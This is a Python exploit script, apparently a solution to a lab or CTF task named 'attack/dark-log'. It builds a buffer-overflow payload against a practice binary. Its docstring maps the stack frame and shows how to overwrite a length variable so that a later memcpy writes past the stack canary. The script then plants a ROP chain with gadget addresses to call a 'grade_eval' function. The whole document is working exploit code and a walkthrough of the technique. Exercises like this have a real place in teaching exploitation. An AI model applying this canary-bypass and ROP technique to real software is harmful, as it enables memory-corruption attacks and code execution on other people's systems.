#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

Stack layout of input() (frame size 0x120), offsets from `expression`
(rbp-0x120):
  0x000 expression[128]
  0x080 logMsg[128]
  0x100 len (int)            <- rbp-0x20
  0x104 pad[8] + gap
  0x118 canary               <- rbp-0x8
  0x120 saved rbp
  0x128 return address

gets() alone cannot touch the return address without corrupting the
canary, so the attack runs in two stages inside one input:

1. Overflow expression through logMsg up to len and set len = 0xa0.
   The canary at offset 0x118 is never written, so it stays valid.
2. The program then executes
       memcpy(logMsg + len, expression, 128).
   With len = 0xa0 the destination is logMsg+0xa0 = rbp, i.e. the
   saved-rbp slot: the copy lands *above* the canary and overwrites
   the saved rbp / return address without touching the canary.

The first 40 bytes of expression are therefore copied to rbp and form
the ROP chain executed after input() returns:
  0x4018a4  ret           alignment padding
  0x4018a3  pop rdi ; ret (hidden in the 41 5f / c3 of __libc_csu_init)
  4         grade argument
  0x401677  grade_eval
input's rbp is 16-byte aligned, so grade_eval is entered at
rsp = rbp+0x28 (rsp % 16 == 8), the ABI-conforming state.
"""
import struct
import sys

RET = 0x4018A4
POP_RDI_RET = 0x4018A3
GRADE_EVAL = 0x401677
LEN_VALUE = 0xA0

expression = b"A" * 8
expression += struct.pack("<Q", RET)
expression += struct.pack("<Q", POP_RDI_RET)
expression += struct.pack("<Q", 4)
expression += struct.pack("<Q", GRADE_EVAL)
expression += b"C" * (128 - len(expression))

log_msg = b"D" * 128

payload = expression
payload += log_msg
payload += struct.pack("<I", LEN_VALUE)
payload += b"\n"

sys.stdout.buffer.write(payload)
